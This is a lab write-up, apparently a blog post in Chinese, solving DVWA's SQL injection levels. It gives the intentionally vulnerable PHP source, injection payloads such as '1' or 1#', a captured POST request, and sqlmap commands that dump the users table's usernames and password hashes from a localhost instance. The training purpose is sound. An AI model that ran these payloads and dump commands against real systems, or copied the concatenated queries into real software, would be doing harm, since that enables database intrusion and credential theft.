---
layout: post
title: "DVWA SQL Injection"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_SQL_Injection
author: ""
tags: ['DVWA', 'SQL_Injection']
---



# DVWA SQL Injection
###### tags: `DVWA`





Low:

這題是查use ID 


我們可以猜測出這樣的語句
```
select * from xxx where user_id='id'
```

以下兩個都成功，說明了是字符型的注入
```
1' or 1#

1' or '1

```



code:
確實跟猜測的差不多。
```php=
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?> 

```

手動注入，之前玩過，所以這邊用sql map 自動注入:


```
隨變輸入產生get 請求。

http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#




參數-u "http://xxxx"

python D:\SQL_map\sqlmap-master\sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" 



加上coockie

python D:\SQL_map\sqlmap-master\sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=2f9c2085585d320a3a85d42a7e1a4566; security=low"




 --batch --dbs
#--batch 自動填入一些 yes no
#--dbs 顯示所有database

python D:\SQL_map\sqlmap-master\sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=2f9c2085585d320a3a85d42a7e1a4566; security=low" --batch --dbs




--batch -D dvwa --tables
#找到dvwa  -D dvwa --tables 查底下的表

python D:\SQL_map\sqlmap-master\sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=2f9c2085585d320a3a85d42a7e1a4566; security=low" --batch -D dvwa --tables




--batch -D "dvwa" --columns -T "users"
#找到dvwa 下有個users  tables 
#看users 表的 columns

python D:\SQL_map\sqlmap-master\sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=2f9c2085585d320a3a85d42a7e1a4566; security=low" --batch -D "dvwa" --columns -T "users"





--dump -D "dvwa"  -T "users" -C "user,password"
#找到 users 表下有兩個 columns user,password
#--dump 顯示出來

python D:\SQL_map\sqlmap-master\sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=2f9c2085585d320a3a85d42a7e1a4566; security=low" --dump -D "dvwa"  -T "users" -C "user,password"



```

最後可以拿到用戶名，和md5加密的密碼。





# Medium

code:
```php=
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Display values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?> 


```


關鍵:
不是字符型，而是bool型
```php=
    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```


這題是POST 所以抓包
id= 1 or 1   或 id=1+or+1，都可以

```
POST /vulnerabilities/sqli/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://localhost
Connection: close
Referer: http://localhost/vulnerabilities/sqli/
Cookie: PHPSESSID=2f9c2085585d320a3a85d42a7e1a4566; security=medium
Upgrade-Insecure-Requests: 1

id=1 or 1&Submit=Submit

```

結果可以看見有注入


可以先刪除sqlmap 緩存:
```
C:\Users\xxx\AppData\Local\sqlmap\output\localhost
```

sql map 使用post 

```

python D:\SQL_map\sqlmap-master\sqlmap.py -u "http://localhost/vulnerabilities/sqli/#"  --cookie "PHPSESSID=2f9c2085585d320a3a85d42a7e1a4566; security=medium" --data "id=1&Submit=Submit" --batch


推薦這招:
-r post.txt 裡面放我們的http數據

python D:\SQL_map\sqlmap-master\sqlmap.py -r post.txt
```

剩下操作都跟上面一樣。

<br/><br/>


#High

code:
一樣是字符型的

```php=
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
}

?> 
```



一樣可以注入:
```
1' or 1#
```




這次分開了輸入和輸出的網頁。

輸入:
http://localhost/vulnerabilities/sqli/session-input.php

輸出:
http://localhost/vulnerabilities/sqli/


多加一個
--second-url "xxxxxx"

```
--second-url

python D:\SQL_map\sqlmap-master\sqlmap.py -r post.txt  --second-url "http://localhost/vulnerabilities/sqli/" --batch


```

<br/><br/>


# Impossible
code:

加了token 雖說應該還是無法防sqlmap (沒測試過)。

但使用了PDO 就無法了

```php=

<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();
        $row = $data->fetch();

        // Make sure only 1 result is returned
        if( $data->rowCount() == 1 ) {
            // Get values
            $first = $row[ 'first_name' ];
            $last  = $row[ 'last_name' ];

            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 

```
















